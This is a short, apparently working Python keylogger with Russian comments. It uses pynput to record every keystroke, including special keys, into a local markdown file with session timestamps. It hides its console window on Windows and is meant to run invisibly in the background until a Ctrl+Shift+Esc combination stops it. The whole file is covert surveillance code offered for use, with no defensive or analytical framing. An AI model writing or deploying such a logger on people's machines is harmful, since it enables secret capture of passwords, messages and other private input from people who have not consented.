"""
Логгер клавиш. Пишет всё в keys.md. Работает невидимо.
Запуск: pythonw keylogger.py (Windows) или python keylogger.py &
Выход: нажми Ctrl+Shift+Escape
"""

from pynput import keyboard
from datetime import datetime
import os
import sys

LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keys.md")


def hide_console():
    """Прячем консоль на Windows"""
    if sys.platform == "win32":
        import ctypes
        ctypes.windll.user32.ShowWindow(
            ctypes.windll.kernel32.GetConsoleWindow(), 0
        )


def init_log():
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"\n---\n## Сессия {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")


def log_key(text):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(text)


def on_press(key):
    try:
        log_key(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            log_key(" ")
        elif key == keyboard.Key.enter:
            log_key("\n")
        elif key == keyboard.Key.backspace:
            log_key(" [BS] ")
        elif key == keyboard.Key.tab:
            log_key(" [TAB] ")
        else:
            log_key(f" [{key.name}] ")


def on_release(key):
    # Ctrl+Shift+Esc для выхода
    pass


def stop_combo(key):
    """Останавливаем по Ctrl+Shift+Esc"""
    if hasattr(stop_combo, "keys"):
        stop_combo.keys.add(key)
    else:
        stop_combo.keys = {key}

    if all(k in stop_combo.keys for k in [
        keyboard.Key.ctrl_l, keyboard.Key.shift, keyboard.Key.esc
    ]):
        log_key("\n\n*[конец сессии]*\n")
        return False


if __name__ == "__main__":
    hide_console()
    init_log()
    with keyboard.Listener(on_press=on_press, on_release=stop_combo) as listener:
        listener.join()
